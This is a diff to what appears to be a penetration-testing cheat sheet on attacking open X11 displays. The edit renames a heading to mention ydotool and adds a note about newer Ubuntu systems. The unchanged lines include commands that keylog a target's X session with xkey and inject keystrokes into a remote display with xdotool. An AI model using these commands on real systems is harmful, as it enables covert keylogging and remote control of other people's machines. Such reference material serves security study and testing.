@@ -60,7 +60,7 @@ xwud -in file.xwd
 - Key logging
 xkey <targetIP>:0.0
 
-xdotool inject
+xdotool/ydotool inject
 Open another Terminal and type:
 
 export DISPLAY=<ipaddress>:0
@@ -75,3 +75,5 @@ xdotool key t
 xdotool key e
 xdotool key r
 xdotool key m
+
+Note: On some systems (like newer Ubuntu versions), you may need to use `ydotool` instead of `xdotool` for the commands above.
